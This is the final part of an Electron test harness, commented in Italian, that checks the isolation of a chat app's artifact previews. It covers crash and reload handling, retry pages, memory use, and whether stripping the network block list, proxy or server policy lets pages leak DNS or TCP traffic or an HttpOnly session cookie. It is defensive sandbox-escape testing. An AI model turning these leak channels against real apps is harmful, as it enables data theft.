        ospiti: ospitiDellePagine.filter((q) => q.includes(`-${nome}-`)).map((q) => q.replace(/^[0-9a-f]{32}\.localhost:\d+/u, 'E')) });
      o.chiudi(); scrivi();
    }
  }

  /* la pagina trattiene (`beforeunload` dopo un gesto): la finestra si chiude lo stesso? */
  const gesto = async (w) => {
    await conTetto(w.webContents.executeJavaScript('document.body && document.body.click(); 1', true));
    w.webContents.sendInputEvent({ type: 'mouseDown', x: 20, y: 20, button: 'left', clickCount: 1 });
    w.webContents.sendInputEvent({ type: 'mouseUp', x: 20, y: 20, button: 'left', clickCount: 1 });
    await attendi(300);
    return conTetto(w.webContents.executeJavaScript('navigator.userActivation ? navigator.userActivation.hasBeenActive : null'));
  };
  const chiusura = (come) => async (w, r, finestre) => {
    if (come === 'senza-ascolto') w.webContents.removeAllListeners('will-prevent-unload');
    r.attivazione = await gesto(w);
    if (come === 'tutte') finestre.chiudiTutte(); else w.close();
    await attendi(1500);
    r.chiusa = w.isDestroyed();
    if (!w.isDestroyed()) { r.chiesto = await leggi(w.webContents, 'JSON.stringify(window.__esiti ?? null)'); w.destroy(); }
  };

  /**
   * Giro 3, N1: la principale con tre anteprime (una cade SEMPRE, una solo la prima volta, una innocua), la lista del modulo, la
   * sorveglianza del modulo (come in `main.mjs`) e la regola vera dell'app. Si aspetta la riga della colpevole, poi altri 2,5 secondi:
   * se nascesse un giro di ricariche, il servizio la conterebbe.
   */
  async function cadute(nome, { etichette = false } = {}) {
    if (SOLO.length && !SOLO.includes(nome)) return;
    const r = esito.scenari[nome] = { righe: [] };
    const o = await orecchie();
    let chiudiRegistro = async () => ({});
    try {
      const jar = session.fromPartition(`prova-${numero += 1}-${nome}`);
      chiudiRegistro = await registroDiRete(jar, o);
      const conto = contaAscolti(jar);
      modulo.chiudiRetePagineRese?.(jar, () => A);
      r.ascolti = conto.posati;
      const w = new BrowserWindow({ show: false, webPreferences: { contextIsolation: true, nodeIntegration: false, sandbox: true, session: jar } });
      w.webContents.on('render-process-gone', () => { r.principaleCaduta = (r.principaleCaduta ?? 0) + 1; });
      r.sorvegliata = typeof modulo.sorvegliaAnteprime === 'function';
      modulo.sorvegliaAnteprime?.(w.webContents, () => A, { registro: (riga) => r.righe.push(riga) });
      /* giro 5: `etichette` = ogni anteprima sulla SUA origine (come nel guscio); senza, tutte su quella del servizio (la prova al contrario) */
      const davanti = (genere) => (etichette ? sullaSuaOrigine(etichettaDi(`${nome}-${genere}`)) : '');
      const indirizzo = (genere) => `${davanti(genere)}/api/v1/pagine/${CAP}/${genere}-${nome}-${o.portaUdp}-${o.portaTcp}.html`;
      const domanda = new URLSearchParams({ nome, colpevole: indirizzo('crollo'), unavolta: indirizzo('unavolta'), sorella: indirizzo('sorella') });
      const t0 = Date.now();
      /* `loadURL` aspetta anche le cornici: con una cornice caduta durante il carico può non chiudersi mai (misurato, lancio 7). Il
         documento dell'app si legge dalla sua cornice (`mainFrame`), che non aspetta la fine del carico. */
      const pronta = new Promise((fatto) => w.webContents.once('dom-ready', () => fatto(true)));
      w.loadURL(`${A}/?${domanda}`).then(() => { r.caricoFinito = true; }, (e) => { r.caricoFinito = `ERR ${e.message}`; });
      r.caricata = await conTetto(pronta, 10000);
      const stato = async () => json(await leggi(w.webContents.mainFrame, 'JSON.stringify(window.__cadute ?? null)')) ?? {};
      const fine = Date.now() + 16000;
      let s = {};
      while (Date.now() < fine) {
        s = await stato();
        if (s.colpevole?.arrese >= 1 && s.unavolta?.ricariche >= 1) break;
        await attendi(200);
      }
      r.rigaDopoMs = s.colpevole?.arrese >= 1 ? Date.now() - t0 : null;
      await attendi(2500);
      r.stato = await stato();
      r.chieste = chieste(nome);
      r.vive = {};
      const anteprime = [];
      for (const cornice of w.webContents.mainFrame.frames) {
        let dove = ''; try { dove = cornice.url; } catch { continue; }
        const genere = /\/(crollo|unavolta|sorella)-/u.exec(dove)?.[1];
        if (!genere) continue;
        anteprime.push(cornice);
        r.vive[genere] = json(await leggi(cornice, 'JSON.stringify(window.__esiti ?? null)'));
      }
      r.memoria = memoria(anteprime);
      r.app = json(await leggi(w.webContents.mainFrame, 'JSON.stringify(window.__app ?? null)'));
      r.processi = new Set(anteprime.map((c) => { try { return c.osProcessId; } catch { return 0; } })).size;
      w.destroy();
    } catch (e) { r.errore = String(e?.stack ?? e); } finally {
      Object.assign(r, await chiudiRegistro().catch(() => ({ dnsUdp: -1, dnsTcp: -1 })));
      Object.assign(r, { udp: o.udp, tcp: o.tcp, tcpByte: o.tcpByte, ospiti: ospitiDellePagine.filter((q) => q.includes(`-${nome}-`)).length });
      o.chiudi(); scrivi();
    }
  }

  /* la finestra dell'artefatto su una pagina che cade: aspetta che si chiuda (o 12 secondi), poi quante volte il servizio l'ha data */
  const finoAllaChiusura = (genere, nome) => async (w, r) => {
    const fine = Date.now() + 12000;
    while (Date.now() < fine && !w.isDestroyed() && !(genere === 'unavolta' && (richieste.get(`unavolta-${nome}`) ?? 0) >= 2)) await attendi(200);
    await attendi(2500);
    r.chiusa = w.isDestroyed();
    r.chieste = richieste.get(`${genere}-${nome}`) ?? 0;
    if (!w.isDestroyed()) { r.esiti = await leggi(w.webContents, 'JSON.stringify(window.__esiti ?? null)'); w.destroy(); }
  };

  /**
   * Giro 4 (C3): la finestra su una pagina che cade SEMPRE. Si aspetta la riga (un documento `data:` nella finestra), la si legge, si fa
   * clic VERO col mouse su «Riprova», e si aspetta che il servizio dia di nuovo la pagina due volte (Riprova + UNA ricarica) e torni la riga.
   */
  const rigaERiprova = (nome) => async (w, r) => {
    const chiesta = () => richieste.get(`crollo-${nome}`) ?? 0;
    const sullaRiga = () => !w.isDestroyed() && w.webContents.getURL().startsWith('data:');
    const finoA = async (condizione, tetto = 12000) => { const fine = Date.now() + tetto; while (Date.now() < fine && !w.isDestroyed() && !condizione()) await attendi(150); };
    const leggiRiga = async () => json(await leggi(w.webContents, 'JSON.stringify({ lingua: document.documentElement.lang, titolo: document.querySelector("h1")?.textContent, testo: document.querySelector("p")?.textContent, riprova: document.querySelector("a")?.textContent, ruolo: document.querySelector("main")?.getAttribute("role"), copioni: document.scripts.length })'));
    await finoA(sullaRiga);
    await attendi(400);
    r.chieste = chiesta();
    r.chiusa = w.isDestroyed();
    if (w.isDestroyed()) return;
    r.riga = await leggiRiga();
    r.titolo = w.getTitle();
    /* «Riprova»: un clic col mouse nel punto del collegamento */
    const punto = json(await leggi(w.webContents, 'JSON.stringify((() => { const q = document.querySelector("a").getBoundingClientRect(); return { x: Math.round(q.x + q.width / 2), y: Math.round(q.y + q.height / 2) }; })())'));
    if (punto) {
      w.webContents.sendInputEvent({ type: 'mouseDown', x: punto.x, y: punto.y, button: 'left', clickCount: 1 });
      w.webContents.sendInputEvent({ type: 'mouseUp', x: punto.x, y: punto.y, button: 'left', clickCount: 1 });
    }
    await finoA(() => chiesta() >= r.chieste + 1);
    r.dopoIlClic = chiesta();
    await finoA(() => chiesta() >= r.chieste + 2 && sullaRiga());
    await attendi(2500); // un giro di ricariche si conterebbe qui
    r.chiesteDopo = chiesta();
    r.chiusaDopo = w.isDestroyed();
    r.rigaDopo = w.isDestroyed() ? null : await leggiRiga();
    if (!w.isDestroyed()) w.destroy();
  };

  /**
   * Giro 5 (controllore del giro 4, `w-scaduta`): la pagina cade, la ricarica trova il lasciapassare scaduto (404 JSON). La finestra mostra la riga
   * con la frase giusta, mai il JSON; «Riprova» chiede di nuovo la pagina (ancora 404) e torna la stessa riga, mai un giro.
   */
  const rigaScaduta = (nome) => async (w, r) => {
    const chiesta = () => richieste.get(`scade-${nome}`) ?? 0;
    const sullaRiga = () => !w.isDestroyed() && w.webContents.getURL().startsWith('data:');
    const finoA = async (condizione, tetto = 12000) => { const fine = Date.now() + tetto; while (Date.now() < fine && !w.isDestroyed() && !condizione()) await attendi(150); };
    const leggiRiga = async () => json(await leggi(w.webContents, 'JSON.stringify({ lingua: document.documentElement.lang, titolo: document.querySelector("h1")?.textContent, testo: document.querySelector("p")?.textContent, riprova: document.querySelector("a")?.textContent, ruolo: document.querySelector("main")?.getAttribute("role"), copioni: document.scripts.length, corpo: document.body?.innerText?.slice(0, 200) })'));
    await finoA(sullaRiga);
    await attendi(400);
    r.chieste = chiesta();
    r.chiusa = w.isDestroyed();
    if (w.isDestroyed()) return;
    r.riga = await leggiRiga();
    r.titolo = w.getTitle();
    const punto = json(await leggi(w.webContents, 'JSON.stringify((() => { const q = document.querySelector("a").getBoundingClientRect(); return { x: Math.round(q.x + q.width / 2), y: Math.round(q.y + q.height / 2) }; })())'));
    if (punto) {
      w.webContents.sendInputEvent({ type: 'mouseDown', x: punto.x, y: punto.y, button: 'left', clickCount: 1 });
      w.webContents.sendInputEvent({ type: 'mouseUp', x: punto.x, y: punto.y, button: 'left', clickCount: 1 });
    }
    await finoA(() => chiesta() >= r.chieste + 1);
    await finoA(() => sullaRiga());
    await attendi(2500);
    r.chiesteDopo = chiesta();
    r.chiusaDopo = w.isDestroyed();
    r.rigaDopo = w.isDestroyed() ? null : await leggiRiga();
    if (!w.isDestroyed()) w.destroy();
  };

  /**
   * Giro 5, condizioni b e d, il caso PEGGIORE: una pagina sul suo nome arrivata SENZA la politica del server (non chiusa: `document.cookie` le è
   * permesso), in una finestra SENZA nessuno strato del guscio, con il biscotto vero dell'app posato come lo posa il servizio (HttpOnly, SameSite=Strict,
   * solo per 127.0.0.1). Cosa arriva al servizio lo conta `eco`; quali biscotti tiene la sessione lo dice `cookies.get`.
   */
  async function biscotto(nome) {
    if (SOLO.length && !SOLO.includes(nome)) return;
    const r = esito.scenari[nome] = {};
    try {
      const jar = session.fromPartition(`prova-${numero += 1}-${nome}`);
      await jar.cookies.set({ url: A, name: 'talos_token', value: 'vero', httpOnly: true, sameSite: 'strict', path: '/' });
      const w = new BrowserWindow({ show: false, webPreferences: { contextIsolation: true, nodeIntegration: false, sandbox: true, session: jar } });
      const pagina = `${sullaSuaOrigine(etichettaDi(nome))}/api/v1/pagine/${CAP}/biscottonudo-${nome}-0-0.html`;
      r.caricata = await conTetto(w.loadURL(pagina).then(() => true, (e) => `ERR ${e.message}`), 10000);
      await attendi(2500);
      r.esiti = await leggi(w.webContents, 'JSON.stringify(window.__esiti ?? null)');
      r.biscotti = (await jar.cookies.get({})).map((c) => ({ nome: c.name, valore: c.value, dominio: c.domain, soloQui: c.hostOnly, sameSite: c.sameSite })).sort((a, b) => `${a.dominio}${a.valore}`.localeCompare(`${b.dominio}${b.valore}`));
      w.destroy();
    } catch (e) { r.errore = String(e?.stack ?? e); } finally {
      r.eco = eco.filter((q) => q.n === nome).map(({ n: _n, ...q }) => ({ ...q, ospite: q.ospite?.replace(String(portaA), 'P') }));
      scrivi();
    }
  }

  /**
   * Giro 4 (C1, la misura; solo con PROVA_SOLO che lo nomina): la principale con N anteprime innocue e/o un sito del Browser con K cornici
   * chiuse. Dopo 4 secondi: quanti processi disegnano quelle cornici e quanta memoria privata hanno (KB, `app.getAppMetrics`).
   */
  async function misura(nome, { anteprime = 0, browser = 0, stessa = false } = {}) {
    if (!SOLO.includes(nome)) return;
    const r = esito.scenari[nome] = {};
    try {
      const jar = session.fromPartition(`prova-${numero += 1}-${nome}`);
      modulo.chiudiRetePagineRese?.(jar, () => A);
      const w = new BrowserWindow({ show: false, webPreferences: { contextIsolation: true, nodeIntegration: false, sandbox: true, session: jar } });
      const pronta = new Promise((fatto) => w.webContents.once('did-finish-load', () => fatto(true)));
      w.loadURL(`${A}/?${new URLSearchParams({ misura: '1', nome, anteprime: String(anteprime), browser: String(browser), stessa: stessa ? '1' : '0' })}`).catch(() => {});
      r.caricata = await conTetto(pronta, 15000);
      await attendi(4000);
      const pidDi = (c) => { try { return c.osProcessId; } catch { return 0; } };
      const principale = pidDi(w.webContents.mainFrame);
      const cornici = w.webContents.mainFrame.framesInSubtree.filter((c) => c !== w.webContents.mainFrame);
      const metriche = new Map(app.getAppMetrics().map((m) => [m.pid, m.memory?.privateBytes ?? 0]));
      const gruppo = (filtro) => {
        const pid = [...new Set(cornici.filter(filtro).map(pidDi).filter((p) => p > 0 && p !== principale))];
        const kb = pid.map((p) => metriche.get(p) ?? 0).sort((a, b) => a - b);
        return { cornici: cornici.filter(filtro).length, processi: pid.length, totaleKB: kb.reduce((a, b) => a + b, 0), medianaKB: kb.length ? kb[Math.floor((kb.length - 1) / 2)] : 0, massimoKB: kb.at(-1) ?? 0 };
      };
      r.anteprime = gruppo((c) => { try { return c.url.includes('/api/v1/pagine/'); } catch { return false; } });
      r.browser = gruppo((c) => { try { return c.url.startsWith(B); } catch { return false; } });
      r.principaleKB = metriche.get(principale) ?? 0;
      r.sullaLoroOrigine = cornici.filter((c) => { try { return NOME_DI_PAGINA.test(new URL(c.url).host); } catch { return false; } }).length;
      r.vive = (await Promise.all(cornici.filter((c) => { try { return c.url.includes('/api/v1/pagine/'); } catch { return false; } })
        .map((c) => leggi(c, 'String(window.__esiti?.vivo ?? 0)')))).filter((v) => Number(v) > 0).length;
      w.destroy();
    } catch (e) { r.errore = String(e?.stack ?? e); } finally { scrivi(); }
  }
  if (SOLO.some((nome) => nome.startsWith('mis-'))) {
    for (const [nome, quante] of [['mis-a1', { anteprime: 1 }], ['mis-a5', { anteprime: 5 }], ['mis-a20', { anteprime: 20 }], ['mis-a20-stessa', { anteprime: 20, stessa: true }],
      ['mis-b20', { browser: 20 }], ['mis-vuota', {}]]) await misura(nome, quante);
  }

  /* F4: dopo il nostro ascolto, l'istruzione del mutante K12 e una riassegnazione del metodo */
  const unSecondo = (jar, _conto, r) => {
    r.secondo = secondoAscolto(jar);
    try { jar.webRequest.onHeadersReceived = () => {}; r.riassegna = 'PASSATO'; } catch (e) { r.riassegna = `ERR ${e.name}`; }
  };
  /* la prova al contrario: un secondo ascolto posato col metodo vero di Electron, dove il sigillo non arriva. La lista sparisce? */
  const unSecondoForzato = (_jar, conto) => { conto.vera((_dettagli, rispondi) => rispondi({})); };

  await Promise.all([
    /* giro 3, N1: la pagina che cade, nell'anteprima in chat e nella finestra dell'artefatto */
    cadute('cadute', { etichette: true }),
    /* giro 5: la prova al contrario di `cadute`: le tre anteprime sulla STESSA origine (quella del servizio), un processo per origine */
    cadute('cadute-stessa'),
    /* giro 5: la pagina sulla sua origine, nell'anteprima e nella finestra: la rete resta chiusa (0/0/0), e senza strati esce (la prova al contrario) */
    principale('etichetta', { protetta: true, da: sullaSuaOrigine(etichettaDi('etichetta')) }),
    principale('etichetta-nuda', { protetta: false, da: sullaSuaOrigine(etichettaDi('etichetta-nuda')), fuga: true }),
    finestra('finestra-etichetta', { etichetta: true }),
    finestra('finestra-etichetta-nuda', { etichetta: true, senza: ['lista', 'proxy', 'politica'], fuga: true }),
    finestra('finestra-scaduta', { genere: 'scade', etichetta: true, carico: 0, dopo: rigaScaduta('finestra-scaduta') }),
    /* giro 5, condizioni b e d: il biscotto, con la politica vera (nella finestra) e nel caso peggiore (senza politica né strati) */
    finestra('biscotto-chiusa', { genere: 'biscotto', etichetta: true }),
    biscotto('biscotto-aperto'),
    finestra('finestra-crollo', { genere: 'crollo', carico: 0, dopo: rigaERiprova('finestra-crollo') }),
    finestra('finestra-unavolta', { genere: 'unavolta', carico: 0, dopo: finoAllaChiusura('unavolta', 'finestra-unavolta') }),
    /* giro 3, F4: il secondo ascolto non toglie più la lista in silenzio */
    principale('sigillo', { protetta: true, dopoLaLista: unSecondo }),
    principale('sigillo-forzato', { protetta: true, dopoLaLista: unSecondoForzato, fuga: true }),
    finestra('sigillo-finestra', { secondo: true }),
    /* giro 3, F3: l'anteprima chiamata con l'altro nome di questa macchina */
    principale('alias', { protetta: true, da: ALIAS, genere: 'sciolta' }),
    principale('alias-nuda', { protetta: false, da: ALIAS, genere: 'sciolta', fuga: true }),
    principale('alias-ferma', { protetta: true, da: ALIAS }),
    /* la finestra dell'artefatto: tutti gli strati, ognuno da solo, e nessuno (la prova al contrario) */
    finestra('finestra'),
    finestra('sola-rete', { senza: ['lista'] }),
    finestra('sola-lista', { senza: ['proxy', 'politica'] }),
    finestra('nuda', { senza: ['lista', 'proxy', 'politica'], fuga: true }),
    /* la stessa finestra su una pagina arrivata SENZA la politica del server */
    finestra('spoglia', { genere: 'nuda' }),
    finestra('spoglia-sola-rete', { genere: 'nuda', senza: ['lista'] }),
    finestra('spoglia-sola-lista', { genere: 'nuda', senza: ['proxy', 'politica'] }),
    finestra('spoglia-nuda', { genere: 'nuda', senza: ['lista', 'proxy', 'politica'], fuga: true }),
    /* l'anteprima in chat, nella principale: rotta delle pagine e rotta vecchia degli artefatti */
    principale('principale', { protetta: true }),
    principale('principale-nuda', { protetta: false, fuga: true }),
    principale('principale-vecchia', { protetta: true, vecchia: true }),
    principale('principale-vecchia-nuda', { protetta: false, vecchia: true, fuga: true }),
    /* dentro la sua cartella la pagina naviga ancora */
    finestra('naviga', { genere: 'parte' }),
    /* titolo e chiusura */
    finestra('titolo', { genere: 'titolo', dopo: async (w, r) => { await attendi(600); r.titolo = w.getTitle(); w.destroy(); } }),
    finestra('trattiene-x', { genere: 'trattiene', dopo: chiusura('x') }),
    finestra('trattiene-tutte', { genere: 'trattiene', dopo: chiusura('tutte') }),
    finestra('trattiene-senza-ascolto', { genere: 'trattiene', dopo: chiusura('senza-ascolto') }),
  ]);

  esito.finito = true; scrivi(); clearTimeout(tettoGenerale);
  for (const w of BrowserWindow.getAllWindows()) if (!w.isDestroyed()) w.destroy();
  serverA.close(); serverB.close();
  app.exit(0);
}
